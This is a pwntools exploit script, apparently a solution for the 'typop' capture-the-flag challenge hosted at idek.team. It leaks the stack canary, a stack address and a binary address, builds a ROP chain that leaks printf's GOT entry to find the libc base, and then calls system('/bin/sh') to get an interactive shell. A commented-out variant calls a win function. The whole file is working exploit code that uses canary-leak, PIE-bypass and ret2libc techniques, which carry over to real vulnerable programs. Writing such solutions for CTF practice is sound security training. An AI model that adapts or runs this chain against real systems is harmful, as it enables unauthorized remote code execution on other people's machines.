from pwn import *
"""
p = process("./chall_patched",env={'LD_PRELOAD':'./libc.so.6'})

context.terminal = ["tmux", "splitw", "-h"]
gdb.attach(p, '''
set follow-fork-mode child
break execve
continue
''')
"""
p = remote("typop.chal.idek.team",1337)
#p = remote("127.0.0.1",5000)
p.sendafter(b"Do you want to complete a survey?",b"y\n")
p.sendafter(b"Do you like ctf?",b"y"*(0x12-0x8)+b'm')

libc = ELF('./libc.so.6')


data = p.recvuntil("You said: ")
data = p.recvline().replace(b'\n',b'')
print("Recv:",data)


canary = data[11:18]
stackaddr = data[18:]
canary = u64(b'\x00'+canary)

stackaddr = u64(data[18:]+b'\x00'*(8-len(stackaddr)))


print("Canary:",hex(canary))
print("Stack:",hex(stackaddr))


p.sendafter(b"Can you provide some extra feedback?",b"y"*(0x12-0x8)+p64(canary))



p.sendafter(b"Do you want to complete a survey?",b"y\n")
p.sendafter(b"Do you like ctf?",b"y"*(0x12-0x8)+b'a'*8+b't'*8)

data = p.recvuntil("You said: ")
data = p.recvline().replace(b'\n',b'')

funcaddr = data[-6:]
funcaddr = u64(funcaddr + b'\x00'*(8-len(funcaddr)))
print("Function address:",hex(funcaddr))

offset = 0x0000000000001447
base = funcaddr - offset
pop_rdi = base + 0x00000000000014d3
pop_rsi_r15 = base + 0x00000000000014d1
win = base + 0x000000000000124e

puts_plt = base + 0x00000000000010d0
puts_got = base + 0x3f90
read_got = base + 0x3fa8
printf_got = base + 0x3fa0
exit_got = base + 0x3fd0
ret = base + 0x000000000000101a
func = base + 0x0000000000001348
p.sendafter(b"Can you provide some extra feedback?",b"y"*(0x12-0x8)+\
p64(canary)+p64(stackaddr)+p64(pop_rdi)+p64(printf_got)\
+p64(puts_plt)+p64(func))
print(p.recvline())
puts_addr = p.recvline().replace(b'\n',b'')
puts_addr = u64(puts_addr + b'\x00'*(8-len(puts_addr)))
print("printf addr:",hex(puts_addr))



baselibc = puts_addr - libc.symbols['printf']

system = baselibc+libc.symbols['system']
binsh = baselibc+next(libc.search(b'/bin/sh'))
print("base:",hex(baselibc))
print("printf offset",hex(libc.symbols['printf']))
print("exit offset",hex(libc.symbols['exit']))
print("puts offset",hex(libc.symbols['puts']))
print("system offset",hex(libc.symbols['system']))
print("binsh loc:",hex(binsh))
print("system:",hex(system))
p.sendafter(b"Do you like ctf?",b"y"*(0x12-0x8)+b'a'*8+b't'*8)
data = p.recvuntil("You said: ")
data = p.recvline().replace(b'\n',b'')

funcaddr2 = data[-6:]
funcaddr2 = u64(funcaddr2 + b'\x00'*(8-len(funcaddr2)))
print("Function address:",hex(funcaddr))
p.sendafter(b"Can you provide some extra feedback?",b"y"*(0x12-0x8)+p64(canary)+p64(stackaddr)+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system))
"""
p.sendafter(b"Can you provide some extra feedback?",b"y"*(0x12-0x8)+p64(canary)+p64(stackaddr)+p64(pop_rdi) +\
        p64(ord('f')) + p64(pop_rsi_r15) + p64(ord('l')) + p64(0) +
        p64(win)
)
"""
p.interactive()